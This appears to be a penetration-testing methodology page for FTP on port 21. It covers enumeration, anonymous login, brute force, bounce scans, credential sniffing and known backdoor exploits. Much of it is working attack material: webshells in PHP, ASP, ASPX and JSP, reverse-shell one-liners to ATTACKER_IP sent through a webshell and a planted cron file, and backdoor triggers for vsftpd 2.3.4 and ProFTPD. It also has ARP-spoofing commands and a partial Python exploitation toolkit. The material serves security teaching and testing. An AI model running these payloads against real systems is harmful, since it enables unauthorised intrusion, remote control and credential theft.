---
title: Port 21 — FTP Extend
description: Complete enumeration, reconnaissance, exploitation, and pentesting methodology for FTP (File Transfer Protocol) on Port 21.
navigation:
  icon: i-lucide-folder-sync
  title: Port 21 — FTP
---

## Overview

::badge
Port 21/TCP (Control)
::
::badge
Port 20/TCP (Data - Active)
::
::badge
Ports 1024-65535 (Data - Passive)
::
::badge
File Transfer Protocol
::
::badge
Clear-text
::
::badge
Anonymous Access
::
::badge
File Upload → RCE
::
::badge
Known Backdoors
::

![FTP Banner Grab](https://raw.githubusercontent.com/six2dez/pentest-book/master/img/ftp_banner.png)

> **FTP (File Transfer Protocol)** is one of the oldest protocols still in active use, designed for transferring files between a client and server. It operates on **Port 21** for control commands and **Port 20** (active mode) or a **random high port** (passive mode) for data transfer. FTP transmits **everything in clear text** — including usernames, passwords, and file contents — making it a high-priority target during penetration tests.

::card-group
  ::card
  ---
  title: Anonymous Access
  icon: i-lucide-user-x
  ---
  Many FTP servers allow **anonymous login** by default or misconfiguration — providing unauthenticated access to files and directories.
  ::

  ::card
  ---
  title: Clear-text Credentials
  icon: i-lucide-eye-off
  ---
  FTP transmits usernames and passwords in **plaintext**. Any MITM position allows complete credential interception.
  ::

  ::card
  ---
  title: File Upload → RCE
  icon: i-lucide-upload
  ---
  Writable FTP directories that overlap with **web server roots** allow uploading webshells for **remote code execution**.
  ::

  ::card
  ---
  title: Known Backdoors
  icon: i-lucide-shield-alert
  ---
  Popular FTP software has had **intentional backdoors** (vsftpd 2.3.4) and critical CVEs (ProFTPD, Pure-FTPd) leading to RCE.
  ::
::

::caution
FTP is inherently insecure. In modern environments, it should be replaced with **SFTP** (SSH File Transfer Protocol) or **FTPS** (FTP over TLS). Finding FTP in a pentest is always a high-value finding.
::

---

## How FTP Works

Understanding FTP internals reveals why it's so vulnerable and how to exploit different modes.

### Connection Modes

::tabs
  :::tabs-item{icon="i-lucide-arrow-right" label="Active Mode"}
  ```
  1. Client connects to Server port 21 (control channel)
  2. Client sends PORT command with client IP:PORT
  3. Server INITIATES connection FROM port 20 TO client port
  4. Data transfer occurs on this new connection
  ```

  **Security implication:** Server connects *back* to the client. Firewalls often block this. The `PORT` command reveals the **client's internal IP address**.
  :::

  :::tabs-item{icon="i-lucide-arrow-left" label="Passive Mode"}
  ```
  1. Client connects to Server port 21 (control channel)
  2. Client sends PASV command
  3. Server responds with IP:PORT for data connection
  4. Client INITIATES connection TO server's data port
  5. Data transfer occurs on this new connection
  ```

  **Security implication:** Server reveals its own IP in `PASV` response — may expose **internal/private IP addresses** behind NAT.
  :::
::

### FTP Authentication Flow

::steps{level="4"}

#### Banner

```
220 (vsFTPd 3.0.3)
```
Server sends banner — reveals software name and version.

#### Username

```
USER admin
331 Please specify the password.
```

#### Password

```
PASS password123
230 Login successful.
```

Username and password sent in **clear text**.

#### Session

```
PWD
257 "/home/admin" is the current directory
LIST
150 Here comes the directory listing.
226 Directory send OK.
```

::

### Essential FTP Commands

::collapsible

| Command | Description | Pentesting Use |
|---------|-------------|---------------|
| `USER` | Specify username | Authentication |
| `PASS` | Specify password | Authentication |
| `LIST` / `ls` | List directory | File enumeration |
| `NLST` | Name list (filenames only) | Script-friendly listing |
| `PWD` | Print working directory | Path discovery |
| `CWD` | Change directory | Navigation |
| `CDUP` | Go up one directory | Directory traversal |
| `RETR` / `GET` | Download file | Data exfiltration |
| `STOR` / `PUT` | Upload file | Webshell upload |
| `DELE` | Delete file | Evidence removal |
| `MKD` | Make directory | Create staging area |
| `RMD` | Remove directory | Cleanup |
| `SITE` | Server-specific commands | Config changes, chmod |
| `SITE CHMOD` | Change permissions | Make files executable |
| `STAT` | Server status | Version/config info |
| `SYST` | System type | OS identification |
| `PASV` | Enter passive mode | Reveals server IP |
| `PORT` | Enter active mode | Reveals client IP |
| `TYPE A` | ASCII transfer mode | Text files |
| `TYPE I` | Binary transfer mode | Binary files |
| `SIZE` | File size | Enumeration |
| `MDTM` | File modification time | Timeline analysis |
| `FEAT` | List features | Capability enumeration |
| `QUIT` | Close connection | Session termination |

::

### Common FTP Server Software

| Software | Platform | Config File | Known Issues |
|----------|----------|------------|--------------|
| **vsftpd** | Linux | `/etc/vsftpd.conf` | 2.3.4 backdoor (CVE-2011-2523) |
| **ProFTPD** | Linux/Unix | `/etc/proftpd/proftpd.conf` | mod_copy RCE (CVE-2015-3306) |
| **Pure-FTPd** | Linux/BSD | `/etc/pure-ftpd/` | Buffer overflow CVEs |
| **FileZilla Server** | Windows | `FileZilla Server.xml` | Plaintext password storage |
| **Microsoft FTP** | Windows/IIS | `%SystemRoot%\System32\inetsrv\config` | WebDAV integration issues |
| **WU-FTP** | Legacy Unix | `/etc/ftpaccess` | Multiple ancient CVEs |
| **GlFTPd** | Linux | `glftpd.conf` | Commonly on warez sites |

---

## Enumeration

### Nmap Discovery

::tabs
  :::tabs-item{icon="i-lucide-scan" label="Basic Scan"}
  ```bash [Terminal]
  nmap -sV -sC -p 21 $IP
  ```
  :::

  :::tabs-item{icon="i-lucide-zap" label="Aggressive Scan"}
  ```bash [Terminal]
  nmap -A -p 21 --script=ftp-* $IP
  ```
  :::

  :::tabs-item{icon="i-lucide-shield-alert" label="All FTP Scripts"}
  ```bash [Terminal]
  nmap -p 21 --script=ftp-anon,ftp-bounce,ftp-brute,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 $IP
  ```
  :::

  :::tabs-item{icon="i-lucide-network" label="Non-standard Ports"}
  ```bash [Terminal]
  # FTP sometimes runs on non-standard ports
  nmap -sV -p- --min-rate 10000 $IP | grep -i ftp
  # Common alt ports: 2121, 8021, 990 (FTPS)
  ```
  :::
::

### Banner Grabbing

Banner reveals **software name, version, and sometimes OS** — essential for CVE identification.

::code-group
```bash [Netcat]
nc -nv $IP 21
```

```bash [Telnet]
telnet $IP 21
```

```bash [cURL]
curl -v ftp://$IP
```

```bash [Nmap]
nmap -p 21 --script=banner $IP
```

```bash [OpenSSL (FTPS - Port 990)]
openssl s_client -connect $IP:990
```

```bash [OpenSSL (Explicit FTPS)]
openssl s_client -starttls ftp -connect $IP:21
```
::

::tip
Common banners and what they reveal:
```text
220 (vsFTPd 3.0.3)                           ← vsftpd, version 3.0.3
220 ProFTPD 1.3.5 Server                     ← ProFTPD, version 1.3.5
220 Microsoft FTP Service                    ← IIS FTP
220 FTP server (Pure-FTPd)                   ← Pure-FTPd
220-FileZilla Server 0.9.60                  ← FileZilla Server
220 mail.target.com FTP server ready         ← Hostname revealed
```
::

### Anonymous Login Testing

Anonymous access is the **#1 FTP misconfiguration**. Always test this first.

::tabs
  :::tabs-item{icon="i-lucide-eye" label="Manual Test"}
  ```bash [ftp client]
  ftp $IP
  # Username: anonymous
  # Password: (blank)
  # OR
  # Password: anonymous
  # OR  
  # Password: anonymous@
  # OR
  # Password: any@email.com
  ```

  ```bash [Alternative Usernames]
  ftp $IP
  # Username: ftp
  # Password: (blank)
  # OR
  # Username: anonymous
  # Password: anonymous
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Automated Test"}
  ```bash [Nmap]
  nmap -p 21 --script=ftp-anon $IP
  ```

  ```bash [Metasploit]
  use auxiliary/scanner/ftp/anonymous
  set RHOSTS $IP
  run
  ```

  ```bash [cURL]
  curl ftp://anonymous:anonymous@$IP/
  ```

  ```bash [wget]
  wget --user=anonymous --password=anonymous ftp://$IP/ -r --no-passive
  ```
  :::
::

### System & Feature Detection

```bash [Terminal]
# Connect and check system type
ftp $IP
ftp> syst
215 UNIX Type: L8        ← Unix/Linux system
# OR
215 Windows_NT           ← Windows system

ftp> feat
211-Features:
 EPRT
 EPSV
 MDTM
 PASV
 REST STREAM
 SIZE
 TVFS
 UTF8
211 End

ftp> stat
211-FTP server status:
     Connected to ::ffff:10.10.10.1
     Logged in as anonymous
     TYPE: ASCII
     Session bandwidth limit in byte/s is 30000
     No session timeout
     Control connection is plain text
     Data connections will be plain text
211 End of status
```

### Full Directory Enumeration

::steps{level="4"}

#### List All Files (Including Hidden)

```bash [Terminal]
ftp $IP
ftp> ls -la
ftp> ls -la /
ftp> ls -la /home
ftp> ls -la /var
ftp> ls -la /etc
```

#### Recursive Directory Listing

```bash [Terminal]
# Using wget for recursive download
wget -r --no-passive ftp://anonymous:anonymous@$IP/

# Using lftp for recursive listing
lftp -u anonymous,anonymous $IP
lftp> find /
lftp> mirror --verbose /
```

#### Search for Sensitive Files

```bash [Terminal]
# After downloading files
find ./downloaded_ftp -type f \( \
  -name "*.conf" -o \
  -name "*.config" -o \
  -name "*.cfg" -o \
  -name "*.xml" -o \
  -name "*.txt" -o \
  -name "*.bak" -o \
  -name "*.old" -o \
  -name "*.sql" -o \
  -name "*.db" -o \
  -name "*.log" -o \
  -name "*.key" -o \
  -name "*.pem" -o \
  -name "*.crt" -o \
  -name "id_rsa" -o \
  -name "id_ed25519" -o \
  -name "*.kdbx" -o \
  -name "*.zip" -o \
  -name "*.tar.gz" -o \
  -name "shadow" -o \
  -name "passwd" -o \
  -name "*.php" -o \
  -name "*.asp" -o \
  -name "*.aspx" -o \
  -name "web.config" -o \
  -name ".htpasswd" -o \
  -name ".env" \
\) 2>/dev/null
```

#### Check Write Permissions

```bash [Terminal]
ftp $IP
ftp> put test.txt
# 226 Transfer complete  ← WRITABLE!
# 550 Permission denied  ← Not writable

# Try different directories
ftp> cd /var/www/html
ftp> put test.txt
ftp> cd /tmp
ftp> put test.txt
ftp> cd /upload
ftp> put test.txt
```

::

---

## Recon Methodology

### Complete Recon Checklist

::field-group
  ::field{name="1. Anonymous Access" type="critical"}
  Always test anonymous login first — `anonymous:(blank)`, `anonymous:anonymous`, `ftp:ftp`. This is the **most common FTP misconfiguration** and provides immediate access.
  ::

  ::field{name="2. Banner Analysis" type="critical"}
  Identify FTP software and version from the banner. Immediately search for known CVEs: `searchsploit vsftpd`, `searchsploit proftpd`.
  ::

  ::field{name="3. Writable Directory Check" type="critical"}
  Test every accessible directory for **write permissions**. If the FTP root overlaps with a web server root (`/var/www/html`, `C:\inetpub\wwwroot`), you can upload webshells → RCE.
  ::

  ::field{name="4. Hidden Files" type="critical"}
  Always use `ls -la` (not just `ls`) to reveal **hidden files** like `.htpasswd`, `.env`, `.ssh/`, `.bash_history`, `.git/`.
  ::

  ::field{name="5. Directory Traversal" type="important"}
  Test if you can escape the FTP root:
  ```bash
  cd ../../../etc
  get passwd
  ```
  Misconfigured `chroot` settings may allow filesystem traversal.
  ::

  ::field{name="6. File Content Analysis" type="important"}
  Download and examine **every file** — config files often contain database credentials, API keys, internal URLs, and other sensitive information.
  ::

  ::field{name="7. Web Root Correlation" type="important"}
  If port 80/443 is also open, check if FTP files appear in the web root. Upload a test file via FTP and try to access it via HTTP.
  ::

  ::field{name="8. Passive Mode IP Leak" type="medium"}
  Issue `PASV` command — the server may reveal its **internal/private IP address** in the response, exposing network architecture.
  ::

  ::field{name="9. FTP Bounce Scan" type="medium"}
  Test if the FTP server can be used to **port scan internal networks** via the FTP bounce attack (PORT command abuse).
  ::

  ::field{name="10. Credential Sniffing" type="medium"}
  If you have a MITM position (same network, ARP spoofing), capture FTP credentials in plaintext with Wireshark or tcpdump.
  ::
::

---

## Pentesting Methods

### Anonymous Access Exploitation

::accordion
  :::accordion-item{icon="i-lucide-user-x" label="Complete Anonymous Enumeration"}
  ```bash [ftp client]
  ftp $IP
  Name: anonymous
  Password: (press Enter)
  
  230 Login successful.
  
  ftp> pwd
  257 "/" is the current directory
  
  ftp> ls -la
  # List ALL files including hidden
  
  ftp> cd /
  ftp> ls -la
  
  # Navigate common directories
  ftp> cd /home
  ftp> ls -la
  ftp> cd /var
  ftp> ls -la
  ftp> cd /etc
  ftp> ls -la
  
  # Download everything
  ftp> binary
  ftp> prompt OFF
  ftp> mget *
  
  # Check for write access
  ftp> put /tmp/test.txt test.txt
  ```
  :::

  :::accordion-item{icon="i-lucide-download" label="Bulk Download with wget/lftp"}
  ```bash [wget — Recursive Download]
  # Download entire FTP contents
  wget -r --no-passive --no-parent ftp://anonymous:anonymous@$IP/
  
  # With specific directory
  wget -r --no-passive ftp://anonymous:anonymous@$IP/pub/
  ```

  ```bash [lftp — Advanced Mirroring]
  lftp -u anonymous,anonymous $IP
  lftp> set ftp:passive-mode on
  lftp> mirror --verbose --continue /
  lftp> exit
  ```

  ```bash [curlftpfs — Mount as Filesystem]
  # Mount FTP as local filesystem
  mkdir /mnt/ftp
  curlftpfs anonymous:anonymous@$IP /mnt/ftp
  
  # Browse like a local directory
  find /mnt/ftp -type f -ls
  grep -r "password" /mnt/ftp/ 2>/dev/null
  
  # Unmount
  fusermount -u /mnt/ftp
  ```
  :::

  :::accordion-item{icon="i-lucide-search" label="Sensitive File Hunting"}
  ```bash [Terminal — After Download]
  # Search for credentials
  grep -ri "password" ./ftp_loot/ 2>/dev/null
  grep -ri "passwd" ./ftp_loot/ 2>/dev/null
  grep -ri "credential" ./ftp_loot/ 2>/dev/null
  grep -ri "secret" ./ftp_loot/ 2>/dev/null
  grep -ri "api_key" ./ftp_loot/ 2>/dev/null
  grep -ri "token" ./ftp_loot/ 2>/dev/null
  grep -ri "connectionstring" ./ftp_loot/ 2>/dev/null
  grep -ri "db_pass" ./ftp_loot/ 2>/dev/null
  
  # Search for SSH keys
  find ./ftp_loot/ -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "*.key" 2>/dev/null
  
  # Search for database files
  find ./ftp_loot/ -name "*.sql" -o -name "*.db" -o -name "*.sqlite" -o -name "*.mdb" 2>/dev/null
  
  # Search for config files
  find ./ftp_loot/ -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.env" -o -name "web.config" 2>/dev/null
  
  # Search for backup archives
  find ./ftp_loot/ -name "*.zip" -o -name "*.tar.gz" -o -name "*.bak" -o -name "*.old" 2>/dev/null
  
  # Check file types
  find ./ftp_loot/ -type f -exec file {} \; | grep -v "empty"
  ```
  :::
::

### File Upload → Remote Code Execution

::accordion
  :::accordion-item{icon="i-lucide-upload" label="Webshell Upload (FTP + HTTP)"}
  **Prerequisite:** FTP writable directory overlaps with web server document root.

  ::steps{level="5"}

  ##### Identify Web Root Overlap

  ```bash [Terminal]
  # Check if FTP root = Web root
  # Upload a test file via FTP
  ftp $IP
  ftp> put test.txt
  226 Transfer complete.
  
  # Check if it's accessible via HTTP
  curl http://$IP/test.txt
  # If the file is accessible → paths overlap!
  ```

  ##### Create Webshell

  ::code-group
  ```php [shell.php — PHP]
  <?php 
  if(isset($_REQUEST['cmd'])){
      echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
  }
  ?>
  ```

  ```asp [shell.asp — ASP Classic]
  <%
  Set oScript = Server.CreateObject("WSCRIPT.SHELL")
  Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
  Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
  Set oFile = oFileSys.CreateTextFile("C:\inetpub\wwwroot\output.txt", True)
  Call oScript.Run ("cmd.exe /c " & Request.Form("cmd") & " > C:\inetpub\wwwroot\output.txt", 0, True)
  Set oFile = oFileSys.OpenTextFile("C:\inetpub\wwwroot\output.txt", 1)
  Response.Write oFile.ReadAll
  oFile.Close
  Call oFileSys.DeleteFile("C:\inetpub\wwwroot\output.txt", True)
  %>
  ```

  ```aspx [shell.aspx — ASP.NET]
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <script runat="server">
  void Page_Load(object sender, EventArgs e) {
      ProcessStartInfo psi = new ProcessStartInfo();
      psi.FileName = "cmd.exe";
      psi.Arguments = "/c " + Request["cmd"];
      psi.RedirectStandardOutput = true;
      psi.UseShellExecute = false;
      Process p = Process.Start(psi);
      Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
  }
  </script>
  ```

  ```jsp [shell.jsp — Java]
  <%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
      Process p = Runtime.getRuntime().exec(cmd);
      java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
      String line;
      while ((line = br.readLine()) != null) {
          out.println(line);
      }
  }
  %>
  ```
  ::

  ##### Upload via FTP

  ```bash [Terminal]
  ftp $IP
  ftp> binary
  ftp> put shell.php
  226 Transfer complete.
  
  # Or for Windows/IIS
  ftp> put shell.aspx
  ```

  ##### Execute Commands

  ```bash [Terminal]
  # Linux target
  curl "http://$IP/shell.php?cmd=id"
  curl "http://$IP/shell.php?cmd=whoami"
  curl "http://$IP/shell.php?cmd=cat+/etc/passwd"
  
  # Reverse shell
  curl "http://$IP/shell.php?cmd=bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261"
  ```

  ##### Reverse Shell (Full Interactive)

  ```bash [Attacker — Listener]
  nc -lvnp 4444
  ```

  ```bash [Via Webshell]
  # PHP reverse shell via FTP-uploaded webshell
  curl "http://$IP/shell.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
  ```

  ::warning
  After uploading a webshell, always **clean up** during post-engagement by removing the file to avoid leaving a backdoor.
  ::


  :::accordion-item{icon="i-lucide-file-code" label="Reverse Shell Upload (No Web Server)"}
  If the FTP upload directory is writable but not a web root, try alternative approaches:

  ```bash [Upload authorized_keys via FTP]
  # If FTP root is a user's home directory
  # Generate SSH key
  ssh-keygen -t rsa -f ftp_key -N ""
  
  ftp $IP
  ftp> mkdir .ssh
  ftp> cd .ssh
  ftp> put ftp_key.pub authorized_keys
  ftp> quit
  
  # SSH in using the key
  ssh -i ftp_key user@$IP
  ```

  ```bash [Upload Cron Job]
  # If /etc/cron.d or user crontab is writable
  echo "* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > cron_shell
  
  ftp $IP
  ftp> cd /etc/cron.d
  ftp> put cron_shell
  # Wait for cron to execute (up to 1 minute)
  ```
  :::


### Known Backdoors & CVE Exploits

::accordion
  :::accordion-item{icon="i-lucide-shield-alert" label="vsftpd 2.3.4 Backdoor (CVE-2011-2523)"}
  An **intentional backdoor** was inserted into the vsftpd 2.3.4 source code. Sending a username containing `:)` (smiley face) triggers a bind shell on **port 6200**.

  ::steps{level="5"}

  ##### Detection

  ```bash [Nmap]
  nmap -p 21 --script ftp-vsftpd-backdoor $IP
  ```

  ```bash [Banner Check]
  nc -nv $IP 21
  # Look for: 220 (vsFTPd 2.3.4)
  ```

  ##### Manual Exploitation

  ```bash [Terminal 1 — Trigger Backdoor]
  telnet $IP 21
  USER backdoored:)
  PASS anything
  # Connection may hang or close
  ```

  ```bash [Terminal 2 — Connect to Backdoor Shell]
  nc -nv $IP 6200
  id
  whoami
  # You have a root shell!
  ```

  ##### Metasploit Exploitation

  ```bash [Metasploit]
  msfconsole
  use exploit/unix/ftp/vsftpd_234_backdoor
  set RHOSTS $IP
  exploit
  ```

  ##### Nmap Script Exploitation

  ```bash [Nmap NSE]
  nmap -p 21 --script ftp-vsftpd-backdoor --script-args ftp-vsftpd-backdoor.cmd="id" $IP
  ```

  ::

  ::note
  The backdoor opens a **root shell** on port 6200. If the exploit triggers but port 6200 isn't reachable, a firewall may be blocking it. Try tunneling or alternative exploitation.
  ::
  :::

  :::accordion-item{icon="i-lucide-bug" label="ProFTPD mod_copy RCE (CVE-2015-3306)"}
  ProFTPD 1.3.5 with `mod_copy` enabled allows **unauthenticated** file copying anywhere on the filesystem using `SITE CPFR` and `SITE CPTO` commands.

  ```bash [Manual — Copy /etc/passwd]
  nc -nv $IP 21
  SITE CPFR /etc/passwd
  350 File or directory exists, ready for destination name
  SITE CPTO /var/www/html/passwd.txt
  250 Copy successful
  
  # Access via web browser
  curl http://$IP/passwd.txt
  ```

  ```bash [Manual — Write PHP Webshell]
  # First, inject PHP code via SITE CPFR/CPTO
  nc -nv $IP 21
  SITE CPFR /proc/self/cmdline
  350 File or directory exists, ready for destination name
  SITE CPTO /var/www/html/info.php
  250 Copy successful
  ```

  ```bash [Metasploit]
  use exploit/unix/ftp/proftpd_modcopy_exec
  set RHOSTS $IP
  set SITEPATH /var/www/html
  exploit
  ```

  ```bash [Searchsploit]
  searchsploit proftpd mod_copy
  searchsploit -m 36803
  python3 36803.py $IP 21 /var/www/html
  ```

  ::caution
  `mod_copy` works even for **unauthenticated users** — you don't need valid credentials. This makes it extremely dangerous.
  ::
  :::

  :::accordion-item{icon="i-lucide-bug" label="ProFTPD 1.3.3c Backdoor"}
  Similar to vsftpd, ProFTPD source was compromised with a backdoor.

  ```bash [Terminal]
  telnet $IP 21
  HELP ACIDBITCHEZ
  # If vulnerable, a root shell opens
  ```

  ```bash [Metasploit]
  use exploit/unix/ftp/proftpd_133c_backdoor
  set RHOSTS $IP
  exploit
  ```
  :::

  :::accordion-item{icon="i-lucide-bug" label="Pure-FTPd CVE-2020-9365 (OOB Read)"}
  ```bash [Terminal]
  searchsploit pure-ftpd
  # Check version for applicable CVEs
  ```
  :::

  :::accordion-item{icon="i-lucide-bug" label="Microsoft IIS FTP — CVE-2009-3023 (MS09-053)"}
  IIS FTP Service buffer overflow via crafted `NLST` command:

  ```bash [Metasploit]
  use exploit/windows/ftp/ms09_053_ftpd_nlst
  set RHOSTS $IP
  set LHOST ATTACKER_IP
  exploit
  ```
  :::
::

### Brute Force Attacks

::accordion
  :::accordion-item{icon="i-lucide-lock-open" label="FTP Credential Brute Force"}
  ::code-group
  ```bash [Hydra]
  # Basic brute force
  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$IP -t 16 -V
  
  # Single user, password list
  hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://$IP -t 16
  
  # With custom port
  hydra -L users.txt -P passwords.txt ftp://$IP -s 2121 -t 16
  ```

  ```bash [Medusa]
  medusa -h $IP -U users.txt -P passwords.txt -M ftp -t 16
  ```

  ```bash [Nmap]
  nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=pass.txt $IP
  ```

  ```bash [Patator]
  patator ftp_login host=$IP user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg='Login incorrect'
  ```

  ```bash [Metasploit]
  use auxiliary/scanner/ftp/ftp_login
  set RHOSTS $IP
  set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
  set PASS_FILE /usr/share/wordlists/rockyou.txt
  set THREADS 16
  run
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-key" label="Common Default Credentials"}
  | Software | Username | Password |
  |----------|----------|----------|
  | Generic | `anonymous` | *(blank)* |
  | Generic | `anonymous` | `anonymous` |
  | Generic | `ftp` | `ftp` |
  | Generic | `admin` | `admin` |
  | Generic | `root` | `root` |
  | FileZilla | `admin` | `admin` |
  | vsftpd | `ftpuser` | *(varies)* |
  | Cisco | `cisco` | `cisco` |
  | HP iLO | `Administrator` | *(varies)* |
  | Xerox | `admin` | `1111` |
  | Samsung Printer | `admin` | `sec00000` |
  :::
::

### FTP Bounce Attack

::accordion
  :::accordion-item{icon="i-lucide-network" label="Port Scanning via FTP Bounce"}
  The FTP `PORT` command can be abused to make the FTP server connect to **arbitrary hosts and ports** — effectively turning it into a proxy for port scanning internal networks.

  ```bash [Nmap FTP Bounce Scan]
  # Scan internal host through FTP server
  nmap -Pn -b anonymous:anonymous@$IP $INTERNAL_TARGET_IP
  
  # Scan specific ports
  nmap -Pn -b anonymous:anonymous@$IP -p 80,443,445,3389 $INTERNAL_TARGET_IP
  ```

  ```bash [Manual FTP Bounce]
  telnet $IP 21
  USER anonymous
  PASS anonymous
  
  # Tell server to connect to internal host port 80
  # PORT command format: h1,h2,h3,h4,p1,p2
  # IP: 10.10.10.50 → 10,10,10,50
  # Port 80 → p1=0, p2=80
  PORT 10,10,10,50,0,80
  LIST
  # 150/226 = port open, 425 = port closed
  ```

  ::note
  FTP bounce attacks are rarely possible on modern servers (most disable the `PORT` command for non-client IPs), but older servers and embedded devices may still be vulnerable.
  ::
  :::

  :::accordion-item{icon="i-lucide-arrow-right-left" label="FTP Bounce for Firewall Bypass"}
  Use FTP bounce to access services behind a firewall:

  ```bash [Terminal]
  # Scenario: FTP server at 10.10.10.25 can reach internal 10.10.10.50:22
  # but your attack machine cannot
  
  # Step 1: Generate reverse shell payload
  msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw > payload.bin
  
  # Step 2: Upload payload to FTP
  ftp $IP
  ftp> binary
  ftp> put payload.bin
  
  # Step 3: Use PORT to send payload to internal target
  ftp> PORT 10,10,10,50,0,22
  ftp> RETR payload.bin
  ```
  :::
::

### Directory Traversal

::accordion
  :::accordion-item{icon="i-lucide-folder-tree" label="Escaping Chroot Jail"}
  Misconfigured FTP servers may allow directory traversal outside the FTP root:

  ```bash [Terminal]
  ftp $IP
  ftp> cd ../../../
  ftp> pwd
  # If you see "/" instead of FTP root, chroot is broken!
  
  ftp> cd /etc
  ftp> get passwd
  ftp> get shadow
  
  ftp> cd /root
  ftp> ls -la
  ftp> cd .ssh
  ftp> get id_rsa
  ftp> get authorized_keys
  
  ftp> cd /home
  ftp> ls -la
  # Enumerate all user home directories
  ```

  ```bash [Alternative — URL-based Traversal]
  curl "ftp://anonymous:anonymous@$IP/../../../etc/passwd"
  curl "ftp://anonymous:anonymous@$IP/%2f/etc/passwd"
  ```
  :::
::

### Credential Sniffing

::accordion
  :::accordion-item{icon="i-lucide-wifi" label="FTP Traffic Capture"}
  FTP sends **everything in plaintext** — credentials, commands, and file contents.

  ```bash [tcpdump]
  # Capture FTP credentials on the wire
  tcpdump -i eth0 -A port 21 -w ftp_capture.pcap
  
  # Live credential display
  tcpdump -i eth0 -A port 21 2>/dev/null | grep -E "USER|PASS"
  ```

  ```bash [Wireshark Filters]
  # Filter FTP traffic
  ftp
  
  # Filter credentials specifically
  ftp.request.command == "USER" || ftp.request.command == "PASS"
  
  # Follow TCP stream for full session
  # Right-click → Follow → TCP Stream
  ```

  ```bash [Ettercap — ARP Spoofing + Sniffing]
  ettercap -T -q -i eth0 -M arp:remote /$GATEWAY_IP// /$VICTIM_IP//
  # FTP credentials will appear in output
  ```

  ```bash [Bettercap]
  bettercap -iface eth0
  > net.probe on
  > set arp.spoof.targets $VICTIM_IP
  > arp.spoof on
  > net.sniff on
  # FTP credentials captured automatically
  ```
  :::
::

### Custom Exploitation Scripts

::code-collapse

```python [ftp_exploit_toolkit.py]
#!/usr/bin/env python3
"""
FTP Exploitation Toolkit
- Anonymous login check
- Version detection
- Write permission test
- Sensitive file download
- Webshell upload
"""

import ftplib
import socket
import sys
import os
from colorama import Fore, Style, init

init()

class FTPExploiter:
    def __init__(self, target, port=21):
        self.target = target
        self.port = port
        self.ftp = None
        self.logged_in = False
        self.writable_dirs = []
        
    def banner_grab(self):
        """Grab FTP banner"""
        print(f"\n{Fore.CYAN}[*] Banner Grabbing...{Style.RESET_ALL}")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((self.target, self.port))
            banner = s.recv(1024).decode().strip()
            s.close()
            print(f"{Fore.GREEN}[+] Banner: {banner}{Style.RESET_ALL}")
            return banner
        except Exception as e:
            print(f"{Fore.RED}[-] Banner grab failed: {e}{Style.RESET_ALL}")
            return None
    
    def check_anonymous(self):
        """Check for anonymous login"""
        print(f"\n{Fore.CYAN}[*] Testing Anonymous Login...{Style.RESET_ALL}")
        anon_creds = [
            ('anonymous', ''),
            ('anonymous', 'anonymous'),
            ('anonymous', 'anonymous@'),
            ('ftp', ''),
            ('ftp', 'ftp'),
        ]
        
        for user, passwd in anon_creds:
            try:
                ftp = ftplib.FTP()
                ftp.connect(self.target, self.port, timeout=10)
                ftp.login(user, passwd)
                print(f"{Fore.GREEN}[+] ANONYMOUS LOGIN SUCCESSFUL! ({user}:{passwd}){Style.RESET_ALL}")
                self.ftp = ftp
                self.logged_in = True
                return True
            except ftplib.error_perm:
                continue
            except Exception as e:
                continue
        
        print(f"{Fore.RED}[-] Anonymous login failed{Style.RESET_ALL}")
        return False
    
    def enumerate_files(self, path='/'):
        """Recursively enumerate files"""
        if not self.logged_in:
            return
        
        print(f"\n{Fore.CYAN}[*] Enumerating files from {path}...{Style.RESET_ALL}")
        try:
            self.ftp.cwd(path)
            files = []
            self.ftp.retrlines('LIST', files.append)
            
            for f in files:
                parts = f.split()
                if len(parts) >= 9:
                    perms = parts[0]
                    name = ' '.join(parts[8:])
                    size = parts[4]
                    
                    if name in ['.', '..']:
                        continue
                    
                    full_path = f"{path}/{name}".replace('//', '/')
                    
                    # Color code by type
                    if perms.startswith('d'):
                        print(f"  {Fore.BLUE}📁 {full_path}/{Style.RESET_ALL}")
                        # Check if writable
                        if 'w' in perms:
                            self.writable_dirs.append(full_path)
                            print(f"     {Fore.YELLOW}⚠️  WRITABLE!{Style.RESET_ALL}")
                    else:
                        # Highlight sensitive files
                        sensitive = ['.conf', '.config', '.xml', '.bak', '.sql', 
                                   '.key', '.pem', 'id_rsa', 'passwd', 'shadow',
                                   '.env', '.htpasswd', 'web.config', '.php', '.asp']
                        
                        is_sensitive = any(name.lower().endswith(ext) or name.lower() == ext.lstrip('.') 
                                         for ext in sensitive)
                        
                        if is_sensitive:
                            print(f"  {Fore.RED}🔑 {full_path} ({size} bytes) — SENSITIVE!{Style.RESET_ALL}")
                        else:
                            print(f"  📄 {full_path} ({size} bytes)")
                    
        except ftplib.error_perm as e:
            print(f"  {Fore.YELLOW}[!] Cannot list {path}: {e}{Style.RESET_ALL}")
    
    def test_write(self):
        """Test write permissions on all accessible directories"""
        if not self.logged_in:
            return
        
